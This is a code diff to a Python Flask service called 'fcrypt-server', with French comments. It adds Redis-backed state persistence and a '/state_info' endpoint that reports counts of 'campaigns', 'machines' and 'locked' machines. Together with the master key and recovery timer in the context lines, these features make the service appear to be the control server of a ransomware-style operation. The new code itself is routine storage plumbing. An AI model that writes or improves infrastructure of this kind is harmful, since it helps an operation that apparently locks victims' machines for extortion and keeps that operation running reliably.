@@ -32,6 +32,31 @@ RECOVERY_TTL = int(os.environ.get("RECOVERY_TTL", "3600"))
 DISCORD_BOT_TOKEN = os.environ.get("DISCORD_BOT_TOKEN", "")
 DISCORD_ADMIN_IDS = {s.strip() for s in os.environ.get("DISCORD_ADMIN_IDS", "").split(",") if s.strip()}
 
+# ═══════════════════ PERSISTANCE REDIS ═══════════════════
+_REDIS_URL = os.environ.get("REDIS_URL", "")
+_redis_client = None
+
+if _REDIS_URL:
+    try:
+        import redis
+        _redis_client = redis.from_url(_REDIS_URL, decode_responses=True, socket_connect_timeout=5)
+        _redis_client.ping()
+        print("[state] Redis connecté — persistance OK")
+    except Exception as e:
+        print(f"[state] Redis ERREUR, fallback fichier: {e}")
+        _redis_client = None
+
+_IS_RENDER = bool(os.environ.get("RENDER"))
+if _IS_RENDER and _redis_client is None and not os.environ.get("STATE_FILE_PERSISTENT"):
+    print("=" * 70)
+    print("[WARNING] Render détecté SANS REDIS_URL ni disque persistant.")
+    print("[WARNING] /tmp/ est éphémère → state PERDU à chaque restart.")
+    print("[WARNING] Toutes les campagnes actives deviendront irrécupérables.")
+    print("[WARNING] Fix : configure REDIS_URL ou monte un disque persistant.")
+    print("[WARNING] Pour confirmer que tu as lu : STATE_FILE_PERSISTENT=1")
+    print("=" * 70)
+# ═════════════════════════════════════════════════════════
+
 if not MASTER_KEY_B64:
     raise RuntimeError("MASTER_KEY_B64 manquant")
 
@@ -47,6 +72,13 @@ _state_lock = threading.Lock()
 
 
 def _load_state() -> dict:
+    if _redis_client is not None:
+        try:
+            raw = _redis_client.get("fcrypt:state")
+            return json.loads(raw) if raw else {}
+        except Exception as e:
+            print(f"[state] Redis load error: {e}")
+            return {}
     if STATE_FILE.exists():
         try:
             return json.loads(STATE_FILE.read_text())
@@ -56,6 +88,12 @@ def _load_state() -> dict:
 
 
 def _save_state(state: dict):
+    if _redis_client is not None:
+        try:
+            _redis_client.set("fcrypt:state", json.dumps(state))
+            return
+        except Exception as e:
+            print(f"[state] Redis save error: {e} — fallback fichier")
     try:
         tmp = STATE_FILE.with_suffix(".tmp")
         tmp.write_text(json.dumps(state))
@@ -274,6 +312,24 @@ def health():
 @app.route("/", methods=["GET"])
 def root():
     return jsonify({"status": "ok", "service": "fcrypt-server", "version": "1.1.0"}), 200
+
+
+@app.route("/state_info", methods=["GET"])
+def state_info():
+    _refresh_state()
+    with _state_lock:
+        n_campaigns = sum(1 for k in STATE if k.startswith("c:"))
+        n_machines = sum(1 for k in STATE if k.startswith("h:"))
+        n_locked = sum(1 for k, v in STATE.items()
+                       if k.startswith("m:") and isinstance(v, dict) and v.get("locked"))
+    return jsonify({
+        "backend": "redis" if _redis_client is not None else "file",
+        "state_file": str(STATE_FILE),
+        "is_render": _IS_RENDER,
+        "campaigns": n_campaigns,
+        "machines": n_machines,
+        "locked": n_locked,
+    }), 200
 
 
 @app.errorhandler(404)
